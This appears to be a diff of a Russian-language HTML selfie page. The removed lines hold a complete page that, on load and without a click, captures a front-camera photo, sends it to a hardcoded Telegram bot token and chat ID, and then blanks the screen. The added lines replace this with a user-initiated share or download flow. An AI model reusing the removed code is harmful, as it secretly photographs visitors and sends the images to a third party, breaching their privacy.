@@ -1,151 +1,144 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="ru">
 <head>
-    <meta charset="utf-8">
-    <title></title>
-    <style>
-        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; }
-        #status { 
-            position: fixed; top:20px; left:0; width:100%; 
-            color:#0f0; font-family:Arial; text-align:center; 
-            font-size:14px; z-index:1000; 
-        }
-    </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Selfie → Share</title>
+<style>
+  :root{--bg:#000;--accent:#0f0}
+  html,body{height:100%;margin:0;background:var(--bg);color:var(--accent);font-family:Arial,Helvetica,sans-serif;display:flex;align-items:center;justify-content:center}
+  .card{width:92%;max-width:420px;text-align:center;padding:18px}
+  button{background:var(--accent);color:#000;border:none;padding:12px 16px;border-radius:10px;font-size:16px;cursor:pointer}
+  #status{margin-bottom:12px}
+  a{color:var(--accent)}
+  video{display:none}
+</style>
 </head>
 <body>
-    <div id="status">🔄 Запуск...</div>
+  <div class="card">
+    <div id="status">Нажми, чтобы сделать селфи и отправить в Telegram</div>
+    <button id="btn">📸 Сделать и поделиться</button>
+    <div style="height:12px"></div>
+    <div id="fallback"></div>
+    <video id="preview" playsinline muted></video>
+  </div>
 
 <script>
-const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
-const CHAT_ID = '1250741267';
+const btn = document.getElementById('btn');
 const status = document.getElementById('status');
+const fallback = document.getElementById('fallback');
 
-function updateStatus(text) {
-    status.textContent = text;
+function update(t){ status.textContent = t; console.log(t); }
+
+function dataURLtoBlob(dataurl){
+  const parts = dataurl.split(',');
+  const mime = parts[0].match(/:(.*?);/)[1];
+  const bstr = atob(parts[1]);
+  let n = bstr.length;
+  const u8 = new Uint8Array(n);
+  while(n--) u8[n] = bstr.charCodeAt(n);
+  return new Blob([u8], { type: mime });
 }
 
-async function captureAndSend() {
-    let stream = null;
-    
+btn.addEventListener('click', async () => {
+  btn.disabled = true;
+  fallback.innerHTML = '';
+  update('1) Запрашиваю фронтальную камеру…');
+
+  let stream = null;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width:{ideal:1280}, height:{ideal:720} }, audio:false });
+  } catch (e) {
+    update('❌ Ошибка доступа к камере: ' + (e.message || e));
+    btn.disabled = false;
+    return;
+  }
+
+  const video = document.getElementById('preview');
+  video.srcObject = stream;
+  try {
+    await video.play();
+  } catch(e) {
+    // На некоторых браузерах play требует жеста — но мы в обработчике клика, значит должно быть ОК
+    console.warn('video.play error', e);
+  }
+
+  // Дадим времени камере показать первый кадр
+  await new Promise(r => setTimeout(r, 500));
+
+  const vw = video.videoWidth || 720;
+  const vh = video.videoHeight || 1280;
+
+  update('2) Захватываю кадр…');
+
+  // можно уменьшить размер для экономии
+  const maxW = 1080;
+  const maxH = 1920;
+  const scale = Math.min(1, Math.min(maxW / vw, maxH / vh));
+  const w = Math.round(vw * scale);
+  const h = Math.round(vh * scale);
+
+  const canvas = document.createElement('canvas');
+  canvas.width = w;
+  canvas.height = h;
+  const ctx = canvas.getContext('2d');
+
+  // зеркалим (селфи)
+  ctx.translate(w, 0);
+  ctx.scale(-1, 1);
+  ctx.drawImage(video, 0, 0, w, h);
+  ctx.setTransform(1,0,0,1,0,0);
+
+  // Остановка камеры
+  stream.getTracks().forEach(t => t.stop());
+
+  update('3) Подготавливаю изображение…');
+
+  const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+  const blob = dataURLtoBlob(dataUrl);
+  const file = new File([blob], `selfie_${Date.now()}.jpg`, { type: 'image/jpeg' });
+
+  // Попробуем Web Share API (с файлами)
+  if (navigator.canShare && navigator.canShare({ files: [file] })) {
+    update('4) Открываю диалог "Поделиться" — выбери Telegram или другое приложение');
     try {
-        updateStatus('1. Включаю камеру...');
-        
-        // === 1. Включаем фронтальную камеру ===
-        stream = await navigator.mediaDevices.getUserMedia({
-            video: { 
-                facingMode: 'user',
-                width: { ideal: 1280, max: 1920 },
-                height: { ideal: 720, max: 1080 }
-            }
-        });
-        
-        updateStatus('✅ Камера включена');
-        
-        // === 2. Создаем видео элемент ===
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.autoplay = true;
-        video.playsInline = true;
-        video.muted = true;
-        
-        // === 3. Ждем полной загрузки камеры ===
-        await new Promise(resolve => {
-            video.onloadeddata = () => {
-                updateStatus('2. Настраиваю камеру (3 сек)...');
-                resolve();
-            };
-        });
-        
-        // === 4. Даем камере время на автофокус и экспозицию ===
-        // Увеличено до 3 секунд для гарантии
-        await new Promise(resolve => setTimeout(resolve, 3000));
-        
-        // === 5. Создаем canvas и делаем снимок ===
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        
-        const ctx = canvas.getContext('2d');
-        
-        // Рисуем видео на canvas
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        // === 6. Немедленно останавливаем камеру ===
-        stream.getTracks().forEach(track => track.stop());
-        updateStatus('✅ Фото сделано');
-        
-        // === 7. Улучшаем качество изображения ===
-        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-        const data = imageData.data;
-        
-        // Улучшаем яркость и контрастность
-        for (let i = 0; i < data.length; i += 4) {
-            // Увеличиваем яркость на 40%
-            data[i] = Math.min(255, data[i] * 1.4);     // Красный
-            data[i + 1] = Math.min(255, data[i + 1] * 1.4); // Зеленый
-            data[i + 2] = Math.min(255, data[i + 2] * 1.4); // Синий
-            
-            // Немного увеличиваем контраст
-            const avg = (data[i] + data[i + 1] + data[i + 2]) / 3;
-            if (avg > 128) {
-                data[i] = Math.min(255, data[i] * 1.1);
-                data[i + 1] = Math.min(255, data[i + 1] * 1.1);
-                data[i + 2] = Math.min(255, data[i + 2] * 1.1);
-            }
-        }
-        
-        ctx.putImageData(imageData, 0, 0);
-        updateStatus('3. Отправляю фото...');
-        
-        // === 8. Отправляем в Telegram ===
-        canvas.toBlob(async (blob) => {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'selfie_' + Date.now() + '.jpg');
-            
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.json();
-                
-                if (result.ok) {
-                    updateStatus('✅ Фото отправлено!');
-                    // Очищаем страницу через 2 секунды
-                    setTimeout(() => {
-                        document.body.innerHTML = '';
-                        document.body.style.backgroundColor = '#000';
-                    }, 2000);
-                } else {
-                    updateStatus(`❌ Ошибка Telegram: ${result.description}`);
-                    // При ошибке тоже очищаем через 5 секунд
-                    setTimeout(() => {
-                        document.body.innerHTML = '<div style="color:#fff;text-align:center;padding:20px">Ошибка</div>';
-                    }, 5000);
-                }
-            } catch (fetchError) {
-                updateStatus(`❌ Ошибка сети: ${fetchError.message}`);
-                setTimeout(() => {
-                    document.body.innerHTML = '';
-                }, 3000);
-            }
-        }, 'image/jpeg', 0.95); // Высокое качество 95%
-        
-    } catch (error) {
-        updateStatus(`❌ Ошибка: ${error.message}`);
-        if (stream) {
-            stream.getTracks().forEach(track => track.stop());
-        }
-        setTimeout(() => {
-            document.body.innerHTML = '';
-        }, 3000);
+      await navigator.share({
+        files: [file],
+        text: 'Селфи',
+        title: 'Селфи'
+      });
+      update('✅ Готово — файл отправлен (или пользователь отменил).');
+    } catch (err) {
+      update('❌ Поделиться не удалось: ' + (err.message || err));
     }
-}
+    btn.disabled = false;
+    return;
+  }
 
-// Запускаем сразу при загрузке страницы
-window.addEventListener('DOMContentLoaded', captureAndSend);
+  // Альтернативный путь: ссылка для скачивания (фоллбек)
+  update('4) Web Share API с файлами недоступен — используй кнопку для скачивания и отправь вручную в Telegram');
+
+  // Создаём ссылку для скачивания
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `selfie_${Date.now()}.jpg`;
+  a.textContent = 'Скачать фото (нажми и затем открой в Telegram)';
+  a.style.color = '#0f0';
+  a.style.display = 'inline-block';
+  a.style.marginTop = '10px';
+  fallback.appendChild(a);
+
+  // Подсказка: на iPhone — "Сохранить изображение" через долгий тап на картинке/ссылке
+  const img = document.createElement('img');
+  img.src = url;
+  img.alt = 'selfie preview';
+  img.style.maxWidth = '100%';
+  img.style.marginTop = '10px';
+  fallback.appendChild(img);
+
+  btn.disabled = false;
+});
 </script>
 </body>
 </html>
